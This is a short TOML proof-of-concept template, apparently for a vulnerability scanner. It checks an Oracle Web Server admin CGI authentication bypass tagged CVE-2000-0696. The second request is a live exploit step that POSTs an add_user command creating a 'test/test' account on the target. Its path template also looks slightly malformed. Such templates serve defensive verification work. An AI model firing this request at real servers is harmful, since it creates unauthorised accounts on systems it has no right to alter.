[info]
author = "ave"
description = "PoC/EXP for verification"
id = "POC-AVE-2000-0546"
name = "Oracle Web Server /cgi-bin/admin/admin 认证绕过 PoC"
severity = "high"
tags = ["cve-2000-0696"]
vuln_id = [
    "CVE-2000-0696",
    "AVE-2000-0546",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/admin/admin"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/admin/admin"
protocol = "http"

[poc.requests.body]
content = "command=add_user&username=test&password=test"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "success",
    "added",
    "User",
]
